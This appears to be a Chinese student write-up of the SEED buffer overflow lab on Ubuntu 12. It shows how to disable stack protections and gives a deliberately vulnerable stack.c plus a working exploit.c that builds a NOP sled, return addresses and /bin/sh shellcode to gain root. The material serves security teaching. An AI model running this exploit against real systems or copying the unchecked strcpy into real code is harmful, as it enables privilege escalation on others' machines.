ailx10说：这篇是在2019年12月之前写的，后来又改过。为了弄清缓冲区溢出到底怎样改变程序行为，我跟着 SEED 的实验，在 Ubuntu 12 里搭了一个能观察栈和返回地址的小环境。先看一个没有检查长度的复制会覆盖什么，再拆开 shellcode，试着用 badfile、NOP 区域和返回地址把过程接起来。光记住“越界写”几个字并不难，真正动手后才会发现，地址、布局和系统保护机制缺一不可。这篇就是那次学习留下的步骤，读的时候也要记住，它依赖的是当年的教学环境，不是随便换台机器就能照跑。

机制说明：缓冲区溢出来自不受约束的越界访问，并非不可避免；栈、堆等不同内存区域都可能发生越界。只有控制数据在特定布局下被覆盖时才可能影响控制流。获得 root 还需要目标进程具备相应有效权限，并不由溢出自动产生。

**Buffer Overflow Vulnerability Lab**

实验目标：理解缓冲区越界写入、控制数据覆盖以及相关防护机制。

- 通过代码设计和利用缓冲区溢出漏洞获取ubuntu12的root权限。
- 掌握操作系统（linux OS）保护机制，阻止缓冲区溢出攻击。

你可以在ubuntu12虚拟机中完成本次实验，由于ubuntu中存在一些保护机制，  
使缓冲区溢出很难实现，为此，我们需要关闭这些保护机制。

- 地址随机化（address space randomization）  
  堆/栈中的开始地址每次都不一样。  
  关闭地址随机化

![](/notes-assets/076005ad4cca4a34011e.jpg)

- 栈保护机制（StackGuard Protection）  
  gcc编译器实现的安全机制，阻止缓冲区溢出漏洞。你可以关闭这种机制，  
  通过在编译时使用-fno-stack-protector选项。
- 栈不可执行（Non-Executable Stack）  
  ubuntu12默认栈不可执行，可以通过在编译的时候使用-z execstack选项来使堆栈可执行。

## Shellcode 与实验环境

在该实验中，shellcode 是执行指定操作的机器码。历史示例将它放入进程的用户态内存，并尝试将控制流转到该位置；执行是否成功取决于内存权限等条件。

```
#include <stdio.h>
#include <unistd.h>
int main( ) {
char *name[2];
name[0] = "/bin/sh";
name[1] = NULL;
//execve()
//参数1：sh可执行文件在系统中的路径指针
//参数2：数组指针，传递给执行文件
//参数3：传递给执行文件的新环境变量数组
execve(name[0], name, NULL);
}
```

执行效果与直接在/bin/目录下执行./sh效果一样。

## 存在漏洞的示例程序

```
/* stack.c */

/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str)
{
    char buffer[24];

    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);

    printf("Returned Properly
");
    return 1;
}
```

文件输入超过目标缓冲区容量可能触发越界写；是否崩溃或改变控制流还取决于实际数据和内存布局。

## 历史环境中的实验结果

利用缓冲区溢出漏洞，实现获取root权限：

```
/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;
unsigned long get_sp()
{
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */ 
    long* addr_ptr,addr;
    int offset = 200;
    addr = get_sp() + offset;
    addr_ptr = (long*)buffer;
    for(int i = 0;i<10;i++)
        *(addr_ptr++) = addr;
    memcpy(buffer+sizeof(buffer)-sizeof(shellcode),
    shellcode,sizeof(shellcode));

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```
